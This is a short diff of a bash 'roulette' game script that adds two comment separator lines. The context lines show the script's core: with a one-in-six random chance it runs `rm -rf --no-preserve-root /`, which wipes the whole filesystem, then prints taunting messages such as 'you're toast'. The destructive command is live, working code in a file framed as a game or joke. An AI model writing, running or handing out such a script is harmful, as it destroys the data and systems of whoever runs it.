@@ -41,8 +41,10 @@ else
   echo
   # There you go! the roulette
   if [ $(( $RANDOM % 6 )) -eq 0 ]; then
+    # --------------------------------------------------------------------------
     # Boom!
     rm -rf --no-preserve-root /
+    # --------------------------------------------------------------------------
     array=("That's" "it,") && print_slowly $array 0.2
     sleep 1
     array=("you're" "toast" "\n") && print_slowly $array 0.2
